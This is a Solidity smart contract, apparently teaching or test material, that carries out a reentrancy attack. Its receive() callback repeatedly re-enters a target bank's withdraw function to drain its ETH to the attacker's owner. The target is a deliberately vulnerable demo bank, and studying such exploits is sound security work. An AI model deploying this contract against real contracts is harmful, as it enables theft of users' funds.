// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title ReentrancyAttacker
 * @dev 教学用攻击合约：在 receive 回调中递归调用目标 `withdraw`，配合脆弱的 VulnerableBank 抽干余额。
 */
contract ReentrancyAttacker {
    IBank public immutable bank;
    address public owner;

    /// @notice 本次 attack 存入的种子金额，用于 receive 中判断银行是否还能再付一轮
    uint256 public seedAmount;

    constructor(address payable target) {
        bank = IBank(target);
        owner = msg.sender;
    }

    /// @notice 启动攻击：先存入种子金额，再触发 withdraw（之后会在 receive 回调里递归）
    function attack() external payable {
        require(msg.value > 0, "seed needed");
        seedAmount = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    /// @notice 收款回调：银行余额仍够再付一轮「与种子相同面额」的提款时再重入
    receive() external payable {
        if (address(bank).balance >= seedAmount) {
            bank.withdraw();
        }
    }

    /// @notice 把抽到合约里的 ETH 转给 owner，便于断言
    function drain() external {
        require(msg.sender == owner, "not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "drain fail");
    }
}
